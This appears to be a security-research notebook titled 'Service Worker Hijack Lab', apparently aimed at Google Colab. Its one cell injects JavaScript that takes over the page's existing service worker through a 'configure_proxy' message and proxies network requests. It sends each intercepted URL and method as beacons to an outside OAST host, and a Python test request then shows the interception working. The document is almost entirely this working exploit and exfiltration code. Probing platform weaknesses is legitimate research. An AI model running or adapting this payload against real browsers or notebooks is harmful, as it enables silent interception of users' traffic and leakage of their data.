# Service Worker Hijack Lab

**Run the cell below.** The JavaScript will hijack the existing Colab service worker. Then Python will make a test request.
Check your Oast server for `START`, `SW_HIJACKED`, and `FETCH` beacons.


In [ ]:
from IPython.display import display, Javascript
import requests
import time

# Inject the hijacking script (executes immediately)
display(Javascript("\n(async function() {\n    const OAST = 'https://3lpv9gwt1zmwxwbu5hnbw0ckdutp48vv8.oast.site';\n    new Image().src = OAST + '/START';\n\n    function logBeacon(path, data) {\n        new Image().src = OAST + '/' + path + '?' + (data ? 'msg=' + encodeURIComponent(data) : '');\n    }\n\n    if (!navigator.serviceWorker) {\n        logBeacon('ERROR', 'no_sw');\n        return;\n    }\n\n    // Wait for the service worker to be ready and active\n    const reg = await navigator.serviceWorker.ready;\n    const sw = reg.active;\n    if (!sw) {\n        logBeacon('ERROR', 'no_active');\n        return;\n    }\n\n    // Create two message channels: one for fetch events, one for responses\n    const fetchChannel = new MessageChannel();\n    const responseChannel = new MessageChannel();\n    const fetchPort = fetchChannel.port1;\n    const responsePort = responseChannel.port1;\n\n    // Listen for fetch events on fetchPort\n    fetchPort.onmessage = async (event) => {\n        const data = event.data;\n        if (data.action !== 'fetch') return;\n\n        // Exfiltrate request details\n        logBeacon('FETCH', 'url=' + encodeURIComponent(data.url) + '&method=' + data.method);\n\n        // Forward the request to the real network\n        try {\n            const res = await fetch(data.url, {\n                method: data.method,\n                headers: data.headers,\n                body: data.body\n            });\n            const responseData = await res.arrayBuffer();\n            const responseHeaders = {};\n            for (let [k, v] of res.headers.entries()) responseHeaders[k] = v;\n\n            fetchPort.postMessage({\n                action: 'response',\n                responseId: data.requestId,\n                response: {\n                    status: res.status,\n                    statusText: res.statusText,\n                    headers: responseHeaders,\n                    data: responseData\n                }\n            });\n        } catch (err) {\n            fetchPort.postMessage({\n                action: 'response',\n                responseId: data.requestId,\n                error: err.toString()\n            });\n        }\n    };\n\n    // Listen for the configuration confirmation on responsePort\n    responsePort.onmessage = (event) => {\n        if (event.data && event.data.configured) {\n            logBeacon('SW_HIJACKED', '');\n            // Add a green dot indicator\n            const dot = document.createElement('div');\n            dot.style.cssText = 'position:fixed;bottom:10px;right:10px;width:12px;height:12px;background:#0f0;border-radius:50%;z-index:999999;';\n            document.body.appendChild(dot);\n            console.log('%c\u2705 Service worker hijacked \u2013 network interception active', 'color:green');\n        }\n    };\n\n    // Send the configure_proxy message with both ports\n    sw.postMessage({\n        action: 'configure_proxy',\n        serviceWorkerPort: fetchPort,\n        responsePort: responsePort\n    }, [fetchPort, responsePort]);\n})();\n"))
print('🚀 Hijack script injected. Waiting 3 seconds for configuration...')
time.sleep(3)

# Send a test request – this will be intercepted by the hijacked service worker
print('📡 Sending test request to https://httpbin.org/get...')
r = requests.get('https://httpbin.org/get', params={'test': 'colab_sw_hijack'})
print(f'✅ Response status: {r.status_code}')
print('Check your Oast server for /FETCH beacon with this request.\n')
